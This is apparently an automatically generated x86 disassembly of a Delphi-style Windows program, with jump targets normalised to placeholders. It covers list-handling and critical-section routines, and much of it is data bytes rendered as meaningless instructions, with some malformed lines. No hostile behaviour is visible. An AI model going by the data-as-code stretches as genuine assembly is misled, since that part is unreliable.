add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_411a5c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
mov al [ 0xffffffff98004144 ]
inc ebx
inc ecx
add [ edx + edx * 2 + 0x41 ] dh
outsb
dec ecx
je r-xdata
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
imul ebp [ esi + 0x67 ] 0x7473694c
jo r-xdata
add [ eax - 0x53ffbeae ] ch
push edx
inc ecx
add [ eax - 0x7bffbeae ] dh
inc edi
inc ecx
add [ esp + edx * 2 ] ah
inc ecx
add [ eax + 0x54004154 ] al
push ebp
inc ecx
add [ esi + ecx * 2 + 0x41 ] al
add [ eax + 0x4004155 ] dl
push esi
inc ecx
add [ eax ] ch
push eax
inc ecx
add [ eax + edx * 2 ] dh
inc ecx
add al ah
inc edx
inc ecx
add al dl
push eax
inc ecx
add [ eax ] dl
push ecx
inc ecx
add [ ecx + edx * 2 + 0x41 ] bh
add [ eax ] dh
inc edi
inc ecx
add [ ebx + edx * 2 ] cl
inc ecx
add [ eax ] bh
dec ecx
inc ecx
add [ edx + ecx * 2 ] cl
inc ecx
add [ eax + 0x53 ] cl
inc ecx
add [ eax + 0x53 ] bl
inc ecx
add [ eax + 0x4a ] dh
inc ecx
add ah al
dec edx
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ eax ] cl
dec ebp
inc ecx
add [ eax + 0x4d ] ah
inc ecx
add ah dh
dec ebp
inc ecx
add [ eax - 0x4bffbeb0 ] bl
push eax
inc ecx
add [ ebx + edx * 2 + 0x51fc0041 ] ch
inc ecx
add [ ebp + edx * 2 + 0x55cc0041 ] bh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc esp
inc ecx
add [ eax + 0x74004143 ] bl
push edx
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
enter 0x411a 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
push ebx
je r-xdata
popad
insb
popad
jae r-xdata
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1b ] ah
inc ecx
add [ eax ] dh
add [ eax ] al
add [ ecx + ebx + 0x41 ] cl
add [ esp + esi + 0x34c00040 ] dh
inc eax
push ebx
je r-xdata
popad
insd
mov eax eax
enter 0x411c 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x1c
inc ecx
add [ eax ] cl
add [ eax ] al
add [ esp + ebx ] al
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
insb
pop esp
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax - 0x53ffbea6 ] bl
pop edx
inc ecx
add [ edx + ebx * 2 + 0x41 ] cl
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x57 ] bl
inc ecx
add [ edx + ebx * 2 + 0x41 ] ch
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
jb r-xdata
jae r-xdata
push esp
push esi
inc ecx
add [ eax - 0x47ffbeaa ] ah
push esi
inc ecx
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ eax + 0x57 ] bl
inc ecx
add ah bl
push edi
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor al 0x1a
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insd
dec ebp
insd
outsd
jb r-xdata
insd
cmp al 0x1d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1d ] bl
inc ecx
add [ eax ] dl
add [ eax ] al
add [ ebx + ebx + 0x34b40041 ] dl
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
push esp
push esi
inc ecx
add [ eax - 0x47ffbeaa ] ah
push esi
inc ecx
add [ eax + 0x7400415c ] ch
sub al [ eax ]
loopne r-xdata
popad
inc eax
add [ eax ] ah
xor al [ eax ]
add al 0x5d
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax - 0x47ffbea3 ] ch
push esi
inc ecx
add [ eax + 0x6000415c ] ch
pop esi
inc ecx
add al ah
pop esp
inc ecx
add ah bl
push edi
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ edx + ebx * 2 + 0x41 ] ch
add [ 0x6e614854 ] cl
insb
insd
push eax
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x41 ] ch
add [ eax ] cl
add [ eax ] al
add [ ebx + ebx + 0x34b40041 ] dl
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
push esp
push esi
inc ecx
add [ eax - 0x53ffbea6 ] bl
pop edx
inc ecx
add [ edx + ebx * 2 + 0x41 ] cl
add [ edx + ebx * 2 + 0x41 ] bl
add [ eax + 0x57 ] bl
inc ecx
popad
add [ ebp + 0x1be00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb eax [ ecx ]
add al 0x0
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
add ah dl
pop ebp
inc ecx
add [ 0x6d654d54 ] cl
fcom [ edi + 0x41 ]
je r-xdata
push esp
push esi
inc ecx
je r-xdata
outsd
jb r-xdata
insd
popad
insd
mov eax 0x411d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
sbb eax 0x140041
add [ eax ] al
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
add [ eax - 0x47ffbeaa ] ah
push esi
inc ecx
add [ eax + 0x1c00415c ] ch
pushad
inc ecx
add al ah
pop esp
inc ecx
add ah bl
push edi
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
xor al 0x1e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] dl
inc ecx
add [ eax ] bl
add [ eax ] al
add al dh
sbb al 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
in al 0x5f
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
inc ecx
add ah bl
push edi
inc ecx
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_411d95
sbb al 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
add al 0x5d
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax - 0x47ffbea3 ] ch
push esi
inc ecx
add [ eax + 0x6000415c ] ch
pop esi
inc ecx
add al ah
pop esp
inc ecx
add ah bl
push edi
inc ecx
add ah dl
pop ebp
inc ecx
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
push ebx
push ebx
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
xor al 0x1e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] dl
inc ecx
add [ eax ] bl
add [ eax ] al
add al dh
sbb al 0x41
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
in al 0x5f
inc ecx
add [ esi + edx * 2 + 0x41 ] dl
add [ eax - 0x47ffbeaa ] ah
push esi
inc ecx
add [ eax + 0x1c00415c ] ch
pushad
inc ecx
add al ah
pop esp
inc ecx
add ah bl
push edi
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
sub_412298
push esi
and al [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ ebx ] ah
inc ecx
add [ ebx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ah [ ebx ]
inc ecx
add [ ebx + 0x300041 ] al
add [ eax ] al
jo r-xdata
xor al [ eax ]
and [ edx ] dh
inc eax
add ah cl
xchg ebx eax
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi - 0x682fffbf ] al
inc ecx
add [ esi + edx * 4 - 0x681fffbf ] bl
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0xe004193 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x8004121 ] ah
add [ eax ] al
add [ eax ] dl
add ch bh
inc ecx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
sub_41233f
push ecx
push eax
inc [ edi + edx * 4 - 0x6873ffbf ]
inc ecx
add [ eax - 0x57ffbe69 ] dl
xchg edi eax
inc ecx
add ah bl
xchg edi eax
inc ecx
add [ edi + edx * 4 - 0x684bffbf ] ch
inc ecx
add [ eax - 0x3bffbe69 ] bh
xchg edi eax
inc ecx
add [ eax - 0x68 ] dh
inc ecx
add [ eax + ebx * 4 - 0x655fffbf ] al
inc ecx
add [ eax - 0x6bffbe69 ] dh
xchg edi eax
inc ecx
add [ eax - 0x37ffbe69 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
and al 0x41
outsb
outsb
je r-xdata
add [ ebx * 4 - 0x681fffbf ] ch
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ eax ] al
adc [ eax ] al
std
xchg esp eax
and eax [ ecx ]
pop es
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
[ edi + 0x5e ]
pop ebx
retn
arpl [ ecx + 0x63 ] ax
je sub_412584
loopne r-xdata
outsd
outsb
add [ eax + eax ] dl
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] ah
inc ecx
outsb
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
and al 0x25
inc ecx
add [ edi ] al
or al 0x54
inc edx
popad
jae sub_412594
dec esp
imul ebp [ esi + 0x6b ] 0xc000408d
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ 0x25100041 ] ah
inc ecx
add [ eax + eax ] dl
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax - 0x13ffbe64 ] cl
popfd
inc ecx
add [ eax + 0x2400419d ] dl
popfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax ] ch
popfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dh
add [ ecx ] al
add bh ch
[ eax - 0x63 ]
inc ecx
add [ esp + edx * 2 ] cl
inc edx
popad
jae r-xdata
0x540a0041 0x6f43
insd
jo r-xdata
and al [ ecx ]
in al 0x17
inc ecx
add [ edx ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx - 0x6427ffbf ]
inc ecx
add [ eax ] dl
pushfd
inc ecx
add [ eax - 0x64 ] dh
inc ecx
add [ esp + ebx * 4 + 0x41 ] al
add [ esp + ebx * 4 + 0x41 ] dh
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
jae r-xdata
push edi
mov edi ecx
mov esi edx
mov ebx eax
outsd
outsb
shl [ ecx + eax * 2 ] 0x0
nop
and eax [ ecx ]
add al [ eax ]
pop es
inc ebx
insb
popad
jae r-xdata
and [ ecx ] eax
or [ eax ] al
add bh bh
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
popad
insd
cmp al 0x10
inc eax
add [ eax + eax ] cl
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add edx [ ecx + 0x67 ]
lea eax [ eax ]
inc eax
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004121 ] ah
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
pop ebx
pop ebp
retn 0x8
jae r-xdata
add [ ebx + 0x41254cc0 ] cl
add [ esi ] cl
push cs
push esp
dec ecx
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e20
pop edi
pop esi
or al 0x50
popad
jo r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ebx eax
outsb
je r-xdata
inc ebp
or [ eax - 0x75 ] dl
iretd
jns r-xdata
adc [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
sub_41256c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e3c
pop edi
pop esi
pop ebx
retn
sub_412594
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e20
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4125bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e44
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4126b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4139c8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403498
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403498
test al al
je r-xdata
sub_412714
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4126b4
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4126b4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403498
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412784
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41386c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_412800
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
mov eax [ esi + 0x4 ]
call sub_40326c
mov eax [ esi + 0x8 ]
call sub_40326c
mov eax [ esi + 0xc ]
call sub_40326c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_412840
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4139c8
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031d0
test al al
jne r-xdata
sub_4128a0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4139c8
mov edx eax
mov eax ebp
call sub_403498
test al al
jne r-xdata
sub_4128e4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41297f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404220
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412840
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412986
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
sub_4129a4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404fe0
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4129c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4139c8
mov edx edi
call sub_4129a4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4139c8
mov edx edi
call sub_4129a4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4138b8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4129a4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4138b8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412a68
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4139c8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4128a0
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412ab4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412784
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41386c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_412b28
push ebx
push esi
push edi
push ebp
call sub_4035f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4139c8
call sub_40326c
inc edi
dec ebp
jne r-xdata
sub_412b84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4139c8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412714
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_412bc8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412840
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4139c8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_412c0c
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_412c8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031bc
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c96
lea eax [ ebp - 0x10c ]
call sub_403fbc
retn
sub_412c9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_412b84
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4126a8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_412c0c
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4139c8
